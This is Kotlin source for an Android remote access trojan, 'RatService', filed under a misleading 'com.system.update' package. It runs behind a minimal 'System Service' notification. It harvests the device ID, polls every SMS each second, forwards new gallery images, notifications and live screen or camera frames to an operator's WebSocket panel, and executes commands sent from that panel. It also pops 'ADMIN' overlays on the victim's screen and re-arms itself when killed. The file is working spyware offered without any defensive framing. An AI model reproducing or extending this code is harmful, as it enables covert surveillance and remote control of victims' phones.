package com.system.update

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.JsonObject
import okhttp3.*
import java.util.concurrent.TimeUnit

class RatService : Service() {

    companion object {
        const val NOTIF_ID = 1
        @Volatile var instance: RatService? = null
    }

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .pingInterval(20, TimeUnit.SECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .build()

    private var ws: WebSocket? = null
    private val gson = Gson()
    private var deviceId: String = ""
    private var running = true
    private lateinit var handler: CommandHandler
    private var smsWatcher: SmsWatcher? = null
    private var galleryWatcher: GalleryWatcher? = null
    private var smsPollThread: Thread? = null
    private var reconnectAttempts = 0
    private lateinit var userPrefs: SharedPreferences

    override fun onCreate() {
        super.onCreate()
        instance = this
        userPrefs = getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)

        deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"
        handler = CommandHandler(this, deviceId)

        smsWatcher = SmsWatcher(this) { sms ->
            sendEvent(mapOf("type" to "sms_new", "data" to sms))
        }
        galleryWatcher = GalleryWatcher(this) { img ->
            sendEvent(mapOf("type" to "gallery_new", "data" to img))
        }

        NotificationListener.callback = { data ->
            sendNotificationEvent(data)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIF_ID, buildNotification())
        if (ws == null) {
            connect()
            startHeartbeat()
        }
        try { smsWatcher?.start() } catch (_: Exception) {}
        try { galleryWatcher?.start() } catch (_: Exception) {}
        startSmsPolling()
        return START_STICKY
    }

    private fun startSmsPolling() {
        if (smsPollThread != null) return
        smsPollThread = Thread {
            var lastCount = 0
            while (running) {
                try {
                    val current = handler.countSms()
                    if (current != lastCount) {
                        lastCount = current
                        val smsData = handler.readAllSmsPublic()
                        sendEvent(mapOf(
                            "type" to "sms_full",
                            "data" to smsData
                        ))
                    }
                    Thread.sleep(1000)
                } catch (_: Exception) {}
            }
        }.also { it.start() }
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun connect() {
        // Ambil username dari SharedPreferences — JANGAN fallback ke "unknown"
        val owner = userPrefs.getString("username", "") ?: ""
        if (owner.isEmpty()) {
            // Belum setup, tunggu
            return
        }

        val cfg = App.config
        val url = "${cfg.panelUrl}?deviceId=$deviceId&owner=$owner"
        val req = Request.Builder().url(url).build()

        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                reconnectAttempts = 0
                sendInfo(webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val obj = gson.fromJson(text, JsonObject::class.java)
                    val type = obj.get("type")?.asString

                    if (type == "command") {
                        val id = obj.get("id").asLong
                        val cmd = obj.get("command").asString
                        val args = obj.getAsJsonObject("args")
                        handler.execute(cmd, args) { result ->
                            val payload = JsonObject().apply {
                                addProperty("type", "result")
                                addProperty("commandId", id)
                                add("result", gson.toJsonTree(result))
                            }
                            try { webSocket.send(gson.toJson(payload)) } catch (_: Exception) {}
                        }
                    } else if (type == "chat_reply") {
                        val chatText = obj.get("text")?.asString ?: ""
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            showChatOnOverlay(chatText)
                        }
                    }
                } catch (_: Exception) {}
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                if (running) scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                if (running) scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        val delay = minOf(30000L, 2000L * (reconnectAttempts + 1))
        reconnectAttempts++
        Thread {
            try { Thread.sleep(delay) } catch (_: Exception) {}
            if (running) {
                try { connect() } catch (_: Exception) {}
            }
        }.start()
    }

    fun sendFrame(frameType: String, base64Data: String) {
        try {
            val payload = JsonObject().apply {
                addProperty("type", "event")
                add("data", gson.toJsonTree(mapOf(
                    "type" to "live_frame",
                    "frame_type" to frameType,
                    "data" to base64Data,
                    "ts" to System.currentTimeMillis()
                )))
            }
            ws?.send(gson.toJson(payload))
        } catch (_: Exception) {}
    }

    fun sendChatFromTarget(text: String) {
        try {
            val payload = JsonObject().apply {
                addProperty("type", "event")
                add("data", gson.toJsonTree(mapOf(
                    "type" to "chat_from_target",
                    "data" to mapOf(
                        "text" to text,
                        "ts" to System.currentTimeMillis().toString()
                    )
                )))
            }
            ws?.send(gson.toJson(payload))
        } catch (_: Exception) {}
    }

    private fun sendEvent(data: Map<String, Any>) {
        try {
            val payload = JsonObject().apply {
                addProperty("type", "event")
                add("data", gson.toJsonTree(data))
            }
            ws?.send(gson.toJson(payload))
        } catch (_: Exception) {}
    }

    fun sendNotificationEvent(data: Map<String, String>) {
        try {
            val payload = JsonObject().apply {
                addProperty("type", "event")
                add("data", gson.toJsonTree(mapOf(
                    "type" to "notif_new",
                    "data" to data
                )))
            }
            ws?.send(gson.toJson(payload))
        } catch (_: Exception) {}
    }

    private fun sendInfo(socket: WebSocket) {
        try {
            val payload = JsonObject().apply {
                addProperty("type", "info")
                add("info", gson.toJsonTree(handler.collectInfo()))
            }
            socket.send(gson.toJson(payload))
        } catch (_: Exception) {}
    }

    private fun startHeartbeat() {
        Thread {
            while (running) {
                try {
                    ws?.send(gson.toJson(mapOf("type" to "heartbeat")))
                    Thread.sleep(App.config.heartbeatMs)
                } catch (_: Exception) {}
            }
        }.start()
    }

    private fun showChatOnOverlay(text: String) {
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_PHONE

            val tv = android.widget.TextView(this).apply {
                this.text = "ADMIN: $text"
                setTextColor(android.graphics.Color.WHITE)
                setBackgroundColor(android.graphics.Color.parseColor("#CCB30000"))
                textSize = 13f
                setPadding(30, 20, 30, 20)
            }

            val params = android.view.WindowManager.LayoutParams(
                android.view.WindowManager.LayoutParams.WRAP_CONTENT,
                android.view.WindowManager.LayoutParams.WRAP_CONTENT,
                type,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                android.graphics.PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.CENTER_HORIZONTAL
                y = 200
            }

            wm.addView(tv, params)

            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try { wm.removeView(tv) } catch (_: Exception) {}
            }, 5000)
        } catch (_: Exception) {}
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restart = Intent(applicationContext, RatService::class.java)
            val pi = PendingIntent.getService(
                this, 2, restart,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            am.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, pi)
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running = false
        try { smsPollThread?.interrupt() } catch (_: Exception) {}
        try { smsWatcher?.stop() } catch (_: Exception) {}
        try { galleryWatcher?.stop() } catch (_: Exception) {}
        try { ws?.close(1000, "stop") } catch (_: Exception) {}
        NotificationListener.callback = null
        if (instance === this) instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}